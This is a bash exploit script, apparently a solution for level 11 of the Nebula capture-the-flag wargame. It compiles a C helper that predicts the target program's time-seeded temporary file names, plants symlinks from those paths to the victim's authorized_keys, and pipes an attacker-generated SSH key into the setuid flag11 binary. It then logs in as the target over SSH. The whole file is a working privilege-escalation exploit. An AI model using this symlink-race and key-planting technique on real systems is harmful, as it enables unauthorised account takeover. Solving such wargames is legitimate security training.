#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

export TEMP=$(mktemp -d)
chmod 1730 $TEMP

NUM_PID=${1:-100};
NUM_SEC=${2:-2};
GETRAND_BIN=$(mktemp)
GETRAND=${GETRAND_BIN}.c

ID_RSA=$(mktemp -u)
ID_RSA_PUB=${ID_RSA}.pub

registerTrap "rm $GETRAND $GETRAND_BIN $ID_RSA $ID_RSA_PUB; rm -r $TEMP; unset TEMP" \
  EXIT

# The path reading less than 1KB seems to only read one character, so we have
# to make this string at least 1KB long
_1KB=$(head -c 1024 < /dev/zero | tr '\0' 'x')
ssh-keygen -t rsa -b 1024 -f $ID_RSA -C $_1KB -N "" >/dev/null

cat <<EOF > $GETRAND
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  char *tmp;
  int numPid, pid, p;
  long numSec, s;

  tmp = getenv("TEMP");
  pid = getpid();
  numPid = atoi(argv[1]);
  numSec = atoi(argv[2]);

  for (s = 0; s < numSec; s++) {
    for (p = 0; p < numPid; p++) {
      srandom(time(NULL) + s);
      printf("%s/%d.%c%c%c%c%c%c\n", tmp, pid + (int) numSec * numPid + p,
        (char) ('A' + (random() % 26)), (char) ('0' + (random() % 10)),
        (char) ('a' + (random() % 26)), (char) ('A' + (random() % 26)),
        (char) ('0' + (random() % 10)), (char) ('a' + (random() % 26)));
    }
  }
  return 0;
}
EOF

gcc $GETRAND -o $GETRAND_BIN
for RAND in $($GETRAND_BIN $NUM_PID $NUM_SEC)
do
  ln -s $TARGET_HOME/.ssh/authorized_keys $RAND
done

printf "%s\n%s" \
       "Content-Length: $(( $(cat $ID_RSA_PUB | wc -c) * 5 ))" \
       "$(cat $ID_RSA_PUB)" | $TARGET_HOME/flag11 2>/dev/null >/dev/null || true

ssh $SSH_OPTIONS -i $ID_RSA $TARGET@localhost $EXPLOIT_SCRIPT
exploit_with_binary
